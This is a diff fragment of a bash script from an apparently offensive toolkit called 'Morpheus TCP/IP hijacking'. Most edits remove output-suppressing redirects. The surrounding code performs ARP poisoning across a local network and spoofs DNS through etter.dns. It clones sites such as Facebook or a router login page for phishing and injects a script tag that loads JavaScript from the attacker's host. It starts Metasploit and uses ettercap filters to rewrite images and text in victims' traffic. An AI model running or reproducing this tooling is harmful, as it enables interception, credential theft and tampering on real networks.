+  sed -i "s|PrE|$PrEfI|g" etter.dns
+  cp $IPATH/bin/etter.dns $Edns
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
@@ -1487,7 +1499,7 @@ UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       cd $IPATH/logs
@@ -1504,11 +1516,11 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   # User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
   nOn="Windows NT" # only windows systems are affected...
   tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
-  mv clean-file.log UserAgent.log > /dev/null 2>&1
-  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
-  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
-  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Windows NT"` > /dev/null 2>&1
-  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
+  mv clean-file.log UserAgent.log
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}`
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}`
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Windows NT"`
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}`
   echo "${GreenF}    $HoSt"
   sleep 1
   echo "${GreenF}    $AcLa"
@@ -1557,13 +1569,13 @@ fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
-  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
-  rm $ApachE/index.html > /dev/null 2>&1
-  rm $ApachE/cssbanner.js > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
+  mv /tmp/etter.dns $Edns
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft # backup
+  rm $IPATH/output/UserAgent.ef
+  rm $ApachE/index.html
+  rm $ApachE/cssbanner.js
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -1597,14 +1609,14 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270)
 
 
   # dowloading/clonning website target
@@ -1612,17 +1624,17 @@ cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.c
   echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
   sleep 1 && mkdir $cLon && cd $cLon
   # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
-  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300
   # inject the javascript <TAG> in cloned index.html using SED command
   echo ${BlueF}[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
-  mv copy.html index.html > /dev/null 2>&1
+  mv copy.html index.html
   # copy all files to apache2 webroot
   echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
   sleep 2
   cp index.html $ApachE/index.html # NO dev/null to report file not existence
   cd ..
-  cp -r $cLon $ApachE/$cLon > /dev/null 2>&1
+  cp -r $cLon $ApachE/$cLon
   cd $IPATH
 
 
@@ -1630,11 +1642,11 @@ cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.c
     echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
     cd $IPATH/bin
     cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
-    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+    cp $Edns /tmp/etter.dns # backup
     # use SED bash command
-    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
-    sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+    sed -i "s|TaRgEt|$IP|g" etter.dns
+    sed -i "s|PrE|$PrEfI|g" etter.dns
+    cp $IPATH/bin/etter.dns $Edns
     echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
     cd $IPATH
     sleep 1
@@ -1642,15 +1654,15 @@ cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.c
 
     # start metasploit services
     echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
-    service postgresql start > /dev/null 2>&1
+    service postgresql start
     if [ "$RbUdB" = "YES" ]; then
-    msfdb delete > /dev/null 2>&1
-    msfdb init > /dev/null 2>&1
+    msfdb delete
+    msfdb init
     fi
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
@@ -1667,21 +1679,21 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  rm -r $ApachE/$cLon > /dev/null 2>&1
-  rm -r $IPATH/output/clone > /dev/null 2>&1
+  mv $LoGmSf/*.txt $IPATH/logs
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
+  mv /tmp/etter.dns $Edns
+  rm -r $ApachE/$cLon
+  rm -r $IPATH/output/clone
   cd $IPATH
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-service postgresql stop > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
+service postgresql stop
 # check if exist any reports
 dd=`ls $IPATH/logs`
 if ! [ -z "$dd" ]; then
-Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
 fi
 
 else
@@ -1711,13 +1723,13 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
 
   # retrieve info about modem to inject into clone
@@ -1735,8 +1747,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   # building cloned login modem webpage
   cd $IPATH/bin/phishing/router-modem
-  cp index.html index.rb > /dev/null 2>&1
-  cp login.html login.rb > /dev/null 2>&1
+  cp index.html index.rb
+  cp login.html login.rb
 
   # grab modem ip addr
   MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
@@ -1744,28 +1756,28 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
   sleep 1
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
-  mv copy.html index.html > /dev/null 2>&1
+  mv copy.html index.html
   sed -i "s|GatWa|$GaTe|g" index.html
   sed -i "s|DiSpt|$InjE|g" index.html
   # copy all files to apache2 webroot
   echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
   sleep 2
   cp index.html $ApachE/index.html # NO dev/null to report file not existence
-  cp login.html $ApachE/login.html > /dev/null 2>&1
+  cp login.html $ApachE/login.html
   cd ..
-  cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem > /dev/null 2>&1
+  cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem
   cd $IPATH
 
     # backup all files needed.
     echo ${BlueF}[☠]${white} Backup all files needed${RedF}!${Reset};
     cd $IPATH/bin
     cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
-    cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+    cp $Edns /tmp/etter.dns # backup
     sleep 1
     # use SED bash command
-    sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
-    sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
-    cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+    sed -i "s|TaRgEt|$IP|g" etter.dns
+    sed -i "s|PrE|$PrEfI|g" etter.dns
+    cp $IPATH/bin/etter.dns $Edns
     echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
     cd $IPATH
     sleep 1
@@ -1773,15 +1785,15 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
     # start metasploit services
     echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
-    service postgresql start > /dev/null 2>&1
+    service postgresql start
     if [ "$RbUdB" = "YES" ]; then
-    msfdb delete > /dev/null 2>&1
-    msfdb init > /dev/null 2>&1
+    msfdb delete
+    msfdb init
     fi
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
-/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
 
       # run mitm+filter
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
@@ -1797,26 +1809,26 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
-  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv $LoGmSf/*.txt $IPATH/logs
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
   mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
   mv $IPATH/bin/phishing/router-modem/login.rb $IPATH/bin/phishing/router-modem/login.html
-  mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  rm $IPATH/output/retrieve.log > /dev/null 2>&1
-  rm $ApachE/index.html > /dev/null 2>&1
-  rm $ApachE/login.html > /dev/null 2>&1
-  rm -r $ApachE/router-modem > /dev/null 2>&1
-  # rm -r $IPATH/output/clone > /dev/null 2>&1
+  mv /tmp/etter.dns $Edns
+  rm $IPATH/output/retrieve.log
+  rm $ApachE/index.html
+  rm $ApachE/login.html
+  rm -r $ApachE/router-modem
+  # rm -r $IPATH/output/clone
   cd $IPATH
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
-/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-service postgresql stop > /dev/null 2>&1
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
+service postgresql stop
 # check if exist any reports
 dd=`ls $IPATH/logs`
 if ! [ -z "$dd" ]; then
-Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
 fi
 
 else
@@ -1845,25 +1857,25 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
+cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb
 sleep 1
 
   echo ${BlueF}[☠]${white} Edit img_replace.eft${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+ fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
   sleep 1
 
@@ -1910,13 +1922,13 @@ sleep 1
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
+  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft
   #
   # port-forward
   #
   echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/img_replace.ef > /dev/null 2>&1
+  rm $IPATH/output/img_replace.ef
   cd $IPATH
 
 else
@@ -1942,29 +1954,29 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-cp $IPATH/filters/text_replace.eft $IPATH/filters/text_replace.rb > /dev/null 2>&1
+cp $IPATH/filters/text_replace.eft $IPATH/filters/text_replace.rb
 sleep 1
 
   echo ${BlueF}[☠]${white} Edit text_replace.eft${RedF}!${Reset};
   sleep 1
- fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
- rep_one=$(zenity --title="☠ WORD TO REPLACE ☠" --text "example: hello\nchose a word to be replaced in tcp packet." --entry --width 270) > /dev/null 2>&1
- rep_two=$(zenity --title="☠ WORD TO REPLACE ☠" --text "previous word chosen: $rep_one\nRemmenber: world to be replaced must be of the same legth of the previous one" --entry --width 270) > /dev/null 2>&1
+ fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
+ rep_one=$(zenity --title="☠ WORD TO REPLACE ☠" --text "example: hello\nchose a word to be replaced in tcp packet." --entry --width 270)
+ rep_two=$(zenity --title="☠ WORD TO REPLACE ☠" --text "previous word chosen: $rep_one\nRemmenber: world to be replaced must be of the same legth of the previous one" --entry --width 270)
   # replace values in template.filter with sed bash command
   cd $IPATH/filters
   sed -i "s|IpAdDR|$fil_one|g" text_replace.eft # NO dev/null to report file not existence :D
-  sed -i "s|RePlAcE|$rep_one|g" text_replace.eft > /dev/null 2>&1
-  sed -i "s|InJeC|$rep_two|g" text_replace.eft > /dev/null 2>&1
+  sed -i "s|RePlAcE|$rep_one|g" text_replace.eft
+  sed -i "s|InJeC|$rep_two|g" text_replace.eft
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/text_replace.eft"
   sleep 1
 
@@ -2004,11 +2016,11 @@ sleep 1
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/text_replace.rb $IPATH/filters/text_replace.eft > /dev/null 2>&1
+  mv $IPATH/filters/text_replace.rb $IPATH/filters/text_replace.eft
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/text_replace.ef > /dev/null 2>&1
+  rm $IPATH/output/text_replace.ef
   cd $IPATH
 
 else
@@ -2035,16 +2047,16 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
+  cp $IPATH/filters/template.eft $IPATH/filters/template.rb
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
@@ -2086,11 +2098,11 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
+  mv $IPATH/filters/template.rb $IPATH/filters/template.eft
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
-  rm $IPATH/output/template.ef > /dev/null 2>&1
+  rm $IPATH/output/template.ef
   cd $IPATH
 
 else
@@ -2123,20 +2135,20 @@ echo ""
 sleep 2
 
 # run module?
-rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "[ Devices DHCP discovery ]\nthis module allow users to filter any device\n(domain name OR ip addr) thats trying to access our local lan for the first time (auth)\n\nExecute this module?" --width 300) > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "[ Devices DHCP discovery ]\nthis module allow users to filter any device\n(domain name OR ip addr) thats trying to access our local lan for the first time (auth)\n\nExecute this module?" --width 300)
 if [ "$?" -eq "0" ]; then
 
 
 # chose to input one or two targets to filter
-Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "This module allow users to filter one or two targets" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180) > /dev/null 2>&1
+Tc=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "This module allow users to filter one or two targets" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180)
 
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 sleep 1
-cp $IPATH/filters/dhcp-discovery.eft $IPATH/filters/dhcp-discovery.bak > /dev/null 2>&1
-rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-CeDs=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270) > /dev/null 2>&1
+cp $IPATH/filters/dhcp-discovery.eft $IPATH/filters/dhcp-discovery.bak
+rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through morpheus." --entry --width 270)
+CeDs=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270)
 #
 # pasing rtarget ip addr (add number 7 at the end of domain-name)
 #
@@ -2146,8 +2158,8 @@ echo "$store" > $IPATH/logs/parse
 
 
 if [ "$Tc" = "two targets input" ]; then
-Most=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
-Desc=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270) > /dev/null 2>&1
+Most=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through morpheus." --entry --width 270)
+Desc=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270)
 
   #
   # parsing data (add number 7 at the end of domain-name)
@@ -2180,7 +2192,7 @@ fi
   sed -i "s|rTdN|$store|g" dhcp-discovery.eft
   sed -i "s|FtGh|$CeDs|g" dhcp-discovery.eft
   cd $IPATH
-  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/dhcp-discovery.eft"
   sleep 1
 
@@ -2216,15 +2228,15 @@ fi
 
   # check if exist any reports (.log files)
   if [ -e $IPATH/logs/$store.log ] || [ -e $IPATH/logs/$twoop.log ]; then
-  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
+  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
   fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   sleep 2
-  mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
-  rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
-  rm $IPATH/logs/parse > /dev/null 2>&1
+  mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft
+  rm $IPATH/output/dhcp-discovery.ef
+  rm $IPATH/logs/parse
   rm $IPATH/logs/triggertwo > /dev/nul 2>&1
   cd $IPATH
 
@@ -2253,18 +2265,18 @@ echo "${BlueF}    ╚───────────────────�
 echo ""
 sleep 2
 # run module?
